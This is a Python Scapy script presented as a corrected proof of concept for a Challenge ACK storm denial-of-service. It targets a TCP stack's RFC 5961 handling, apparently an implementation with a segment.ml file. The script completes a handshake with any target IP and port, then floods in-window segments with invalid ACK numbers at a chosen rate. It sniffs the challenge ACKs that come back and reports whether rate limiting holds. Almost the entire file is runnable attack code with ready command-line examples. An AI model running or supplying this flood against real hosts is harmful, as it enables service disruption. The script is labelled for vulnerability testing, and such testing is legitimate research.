#!/usr/bin/env python3
"""
Challenge ACK Storm DoS PoC (CORRECTED VERSION)

This version sends segments with VALID sequence numbers (within window) but
INVALID ACK numbers to trigger Challenge ACKs per RFC 5961.

The original version sent far-future sequence numbers which were simply dropped
by Window.valid(). This version stays within the window to actually trigger
the Challenge ACK path in segment.ml:130.

Author: Security Research
License: Educational/Research Use Only
"""

import argparse
import sys
import time
import random
from scapy.all import *

class ChallengeACKStormV2:
    def __init__(self, target_ip, target_port, source_port=None, rate=100):
        self.target_ip = target_ip
        self.target_port = target_port
        self.source_port = source_port or random.randint(10000, 65000)
        self.rate = rate
        self.packets_sent = 0
        self.acks_received = 0
        self.start_time = None
        self.running = False

    def establish_connection(self):
        """Establish a real TCP connection to get valid 4-tuple and window"""
        print(f"[*] Establishing connection to {self.target_ip}:{self.target_port}")

        ip = IP(dst=self.target_ip)
        syn = TCP(sport=self.source_port, dport=self.target_port,
                  flags='S', seq=1000)
        syn_ack = sr1(ip/syn, timeout=2, verbose=0)

        if not syn_ack or not syn_ack.haslayer(TCP):
            print("[-] Failed to receive SYN-ACK")
            return None

        if syn_ack[TCP].flags != 'SA':
            print(f"[-] Unexpected response: {syn_ack[TCP].flags}")
            return None

        print(f"[+] Received SYN-ACK")
        print(f"    seq={syn_ack[TCP].seq}, ack={syn_ack[TCP].ack}")
        print(f"    window={syn_ack[TCP].window}")

        # Check for window scaling
        wscale = 0
        for opt in syn_ack[TCP].options:
            if isinstance(opt, tuple) and opt[0] == 'WScale':
                wscale = opt[1]
                print(f"    Window scaling: {wscale} (actual window: {syn_ack[TCP].window << wscale})")
                break

        # Send ACK to complete handshake
        ack = TCP(sport=self.source_port, dport=self.target_port,
                  flags='A', seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1)
        send(ip/ack, verbose=0)

        print("[+] Connection established")

        return {
            'seq': syn_ack[TCP].ack,
            'ack': syn_ack[TCP].seq + 1,
            'window': syn_ack[TCP].window << wscale,
            'wscale': wscale
        }

    def send_challenge_ack_triggers(self, conn_state):
        """Send segments that should trigger Challenge ACKs"""
        print(f"\n[*] Starting Challenge ACK storm at {self.rate} pps")
        print(f"[*] Using CORRECTED attack vector:")
        print(f"    - Sequence numbers WITHIN window (0 to {conn_state['window']})")
        print(f"    - ACK numbers INVALID (beyond tx_nxt)")
        print(f"[*] Press Ctrl+C to stop\n")

        ip = IP(dst=self.target_ip)
        self.start_time = time.time()
        self.running = True

        delay = 1.0 / self.rate if self.rate > 0 else 0

        try:
            while self.running:
                # CORRECTED: Sequence number WITHIN the window
                # This passes Window.valid() check
                seq_offset = random.randint(0, min(conn_state['window'], 65535))
                valid_seq = conn_state['seq'] + seq_offset

                # INVALID ACK number to trigger Challenge ACK
                # Per segment.ml:125-130, this should trigger `ChallengeAck
                # if not between [tx_una - max_tx_wnd, tx_nxt]
                invalid_ack = conn_state['ack'] + 0x7FFFFFFF

                pkt = TCP(sport=self.source_port, dport=self.target_port,
                         flags='A', seq=valid_seq, ack=invalid_ack)

                send(ip/pkt, verbose=0)
                self.packets_sent += 1

                if self.packets_sent % 100 == 0:
                    elapsed = time.time() - self.start_time
                    actual_rate = self.packets_sent / elapsed if elapsed > 0 else 0
                    print(f"\r[*] Sent: {self.packets_sent} | "
                          f"Rate: {actual_rate:.1f} pps | "
                          f"Time: {elapsed:.1f}s", end='', flush=True)

                if delay > 0:
                    time.sleep(delay)

        except KeyboardInterrupt:
            print("\n\n[*] Stopping attack...")
            self.running = False

    def sniff_responses(self, conn_state, duration=10):
        """Sniff and count Challenge ACK responses"""
        print(f"\n[*] Monitoring Challenge ACK responses for {duration} seconds...")

        filter_str = f"tcp and src host {self.target_ip} and src port {self.target_port} and dst port {self.source_port}"

        def packet_callback(pkt):
            if pkt.haslayer(TCP):
                tcp = pkt[TCP]
                # Challenge ACK will have ACK flag and acknowledge our sequence
                if tcp.flags == 'A':
                    self.acks_received += 1
                    if self.acks_received <= 5:  # Show first few
                        print(f"\n[DEBUG] ACK: seq={tcp.seq} ack={tcp.ack} window={tcp.window}")

        sniff(filter=filter_str, prn=packet_callback, timeout=duration, store=0)

        print(f"\n[+] Received {self.acks_received} ACKs in {duration} seconds")
        rate = self.acks_received / duration
        print(f"[+] Rate: {rate:.1f} ACKs/sec")

        # RFC 5961 recommends ~100 ACKs/sec limit
        if rate > 110:
            print("[!] VULNERABLE: No effective rate limiting detected!")
            print(f"[!] Expected: ≤100 ACKs/sec, Got: {rate:.1f} ACKs/sec")
            return "VULNERABLE"
        elif rate > 90:
            print("[~] UNCLEAR: Rate is around RFC 5961 limit")
            print("[~] May have rate limiting at ~100/sec")
            return "POSSIBLE"
        else:
            print("[+] PROTECTED: Rate limiting appears effective")
            print(f"[+] Rate {rate:.1f} < 90 ACKs/sec")
            return "PROTECTED"

    def run_storm_test(self):
        """Run the Challenge ACK storm test"""
        conn_state = self.establish_connection()
        if not conn_state:
            print("[-] Failed to establish connection")
            return False

        time.sleep(1)

        # Start sniffing in background
        import threading
        sniffer = threading.Thread(target=self.sniff_responses,
                                   args=(conn_state, 30))
        sniffer.daemon = True
        sniffer.start()

        time.sleep(1)

        # Send attack traffic
        self.send_challenge_ack_triggers(conn_state)

        # Wait for sniffer
        sniffer.join(timeout=5)

        # Statistics
        self.print_statistics()

        return True

    def print_statistics(self):
        """Print attack statistics"""
        if self.start_time:
            elapsed = time.time() - self.start_time
            actual_rate = self.packets_sent / elapsed if elapsed > 0 else 0

            print("\n" + "="*60)
            print("ATTACK STATISTICS")
            print("="*60)
            print(f"Target:           {self.target_ip}:{self.target_port}")
            print(f"Duration:         {elapsed:.2f} seconds")
            print(f"Packets Sent:     {self.packets_sent}")
            print(f"Attack Rate:      {actual_rate:.2f} pps")
            print(f"ACKs Received:    {self.acks_received}")

            if self.acks_received > 0:
                response_rate = self.acks_received / elapsed
                ratio = (self.acks_received / self.packets_sent) * 100
                print(f"Response Rate:    {response_rate:.2f} ACKs/sec")
                print(f"Response Ratio:   {ratio:.1f}%")

                print("\nVULNERABILITY ASSESSMENT:")
                if response_rate > 110:
                    print("  [!] VULNERABLE - segment.ml:135 missing rate limiting")
                    print("  [!] RFC 5961 violation - should limit to ~100 ACKs/sec")
                elif response_rate > 90:
                    print("  [~] UNCLEAR - around RFC 5961 limit")
                else:
                    print("  [+] PROTECTED - Rate limiting working")
            else:
                print("\n[*] No ACKs received")
                print("[*] Possible reasons:")
                print("    - Segments were dropped (firewall?)")
                print("    - Attack vector still incorrect")
                print("    - Challenge ACKs not triggered")

            print("="*60)

def main():
    parser = argparse.ArgumentParser(
        description='Challenge ACK Storm DoS PoC (Corrected)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
CORRECTED ATTACK VECTOR:

The original PoC sent segments with far-future sequence numbers which were
dropped by Window.valid(). This version:

1. Sends segments with sequence numbers WITHIN the receive window
2. Uses INVALID ACK numbers to trigger Challenge ACK path
3. Should actually trigger segment.ml:130 instead of being dropped at line 132

Examples:
  sudo python3 challenge_ack_storm_v2.py --target 10.0.0.2 --port 8080 --rate 100
  sudo python3 challenge_ack_storm_v2.py --target 10.0.0.2 --port 8080 --rate 500
        """)

    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--port', type=int, required=True, help='Target TCP port')
    parser.add_argument('--sport', type=int, help='Source port (random if not specified)')
    parser.add_argument('--rate', type=int, default=100, help='Packet rate in pps')

    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[-] Root privileges required")
        sys.exit(1)

    print("""
╔═══════════════════════════════════════════════════════════╗
║    Challenge ACK Storm DoS PoC (CORRECTED)                ║
║    RFC 5961 Rate Limiting Test - v2                       ║
╚═══════════════════════════════════════════════════════════╝
""")

    print("CORRECTIONS FROM v1:")
    print("  - Sequence numbers now WITHIN window (not far future)")
    print("  - Should pass Window.valid() check")
    print("  - Should trigger Challenge ACK at segment.ml:130")
    print()

    storm = ChallengeACKStormV2(args.target, args.port, args.sport, args.rate)
    storm.run_storm_test()

if __name__ == '__main__':
    main()
